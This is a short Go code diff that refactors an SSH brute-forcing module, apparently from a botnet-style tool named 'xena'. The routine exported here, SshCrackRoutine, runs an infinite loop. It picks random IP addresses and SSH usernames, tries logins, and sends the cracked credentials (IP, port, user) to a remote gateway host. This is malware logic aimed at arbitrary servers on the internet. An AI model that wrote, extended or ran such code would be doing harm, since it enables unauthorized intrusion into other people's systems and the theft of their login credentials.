@@ -1,16 +1,17 @@
-package main
+package modules
 
 import (
 	"fmt"
 	"math/rand"
 	"strconv"
 	"time"
+	"xena/services"
 
 	"golang.org/x/crypto/ssh"
 )
 
-// sshCrackRoutine is an infinite loop of cracking SSH service.
-func sshCrackRoutine() {
+// SshCrackRoutine is an infinite loop of cracking SSH service.
+func SshCrackRoutine(gatewayHost string) {
 	for {
 		address := ipRandomAddress()
 		user := randomSshUser()
@@ -21,7 +22,7 @@ func sshCrackRoutine() {
 			continue
 		}
 		// Temp hardcoded.
-		err = submitCreds(gatewayHost, Creds{
+		err = services.SubmitCreds(gatewayHost, services.Creds{
 			Ip:   address,
 			Port: 22,
 			User: user,
